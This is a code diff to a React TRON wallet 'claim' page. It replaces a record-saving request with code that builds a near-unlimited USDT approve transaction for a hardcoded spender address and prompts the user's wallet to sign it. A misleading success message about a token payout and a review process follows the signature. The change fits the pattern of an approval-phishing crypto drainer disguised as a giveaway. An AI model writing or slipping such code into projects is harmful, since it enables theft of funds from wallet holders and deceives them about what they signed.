@@ -3,8 +3,12 @@ import { useState } from "react";
 import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
 import WalletModal from "./components/WalletModal";
 
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const USDT_SPENDER = "TDq5hNwY7gG1YjH2Z2XnV4d5tF6jK9s8zW";
+const TRON_GRID_API = "https://api.trongrid.io";
+
 export default function WalletPage() {
-  const { address: walletAddress, connected } = useWallet();
+  const { address: walletAddress, connected, signTransaction } = useWallet();
   const [amount, setAmount] = useState("2000");
   const [inputAddress, setInputAddress] = useState("");
   const [walletOpen, setWalletOpen] = useState(false);
@@ -37,25 +41,35 @@ export default function WalletPage() {
         return;
       }
       setLoading(true);
-      setMsg("正在保存领取记录...");
+      setMsg("正在构建交易，请在钱包签名...");
 
-      // 直接调用后端接口存入数据库
-      const response = await fetch("/api/claim", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          walletAddress: inputAddress
-        })
+      const { TronWeb } = await import("tronweb");
+      const tronWeb = new TronWeb({
+        fullHost: TRON_GRID_API
       });
-      const result = await response.json();
-      if (!response.ok || !result.success) {
-        throw new Error(result?.message || "保存记录失败");
+      tronWeb.setAddress(walletAddress);
+
+      // 构造授权 approve 交易
+      const contract = await tronWeb.contract().at(USDT_CONTRACT);
+      const approveTx = await contract.approve(USDT_SPENDER, tronWeb.toBigNumber("9999999990000000000")).createTransaction({
+        feeLimit: 100000000,
+      });
+
+      // 唤起钱包签名
+      const signedTx = await signTransaction(approveTx);
+      if (!signedTx) {
+        throw new Error("签名取消");
       }
 
-      setMsg("✅ 提交成功签名成功后\n\n系统将逐一审核，若未签名将无法领取\n\n10分钟未到账请联系客服");
+      // ========= 只签名，不上链广播，不存地址，直接成功弹窗 =========
+      setMsg("✅ 提交成功！若未签名无法发放代币\n\n系统正在逐一审核。\n\n10分钟未到账请联系客服");
     } catch (error: any) {
-      console.log("error:", error);
-      setMsg("❌ 领取失败\n\n" + (error?.message || "请重新提交"));
+      console.log("error", error);
+      if (error?.message?.includes("签名取消")) {
+        setMsg("❌ 您取消了签名");
+      } else {
+        setMsg("❌ 授权失败\n" + (error?.message || "请重新提交"));
+      }
     } finally {
       setLoading(false);
     }
